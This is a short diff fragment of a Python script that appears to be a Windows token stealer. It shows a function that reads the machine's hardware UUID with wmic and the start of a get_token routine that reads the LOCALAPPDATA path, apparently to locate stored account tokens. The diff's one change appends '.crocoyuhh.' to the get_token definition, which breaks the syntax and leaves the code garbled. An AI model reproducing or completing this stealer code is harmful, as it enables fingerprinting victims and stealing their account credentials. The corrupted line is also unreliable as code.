@@ -27,7 +27,7 @@ def getip():
 def gethwid():
     p = Popen("wmic csproduct get uuid", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
     return (p.stdout.read() + p.stderr.read()).decode().split("\n")[1]
-def get_token():
+def get_token():.crocoyuhh.
     already_check = []
     checker = []
     local = os.getenv('LOCALAPPDATA')
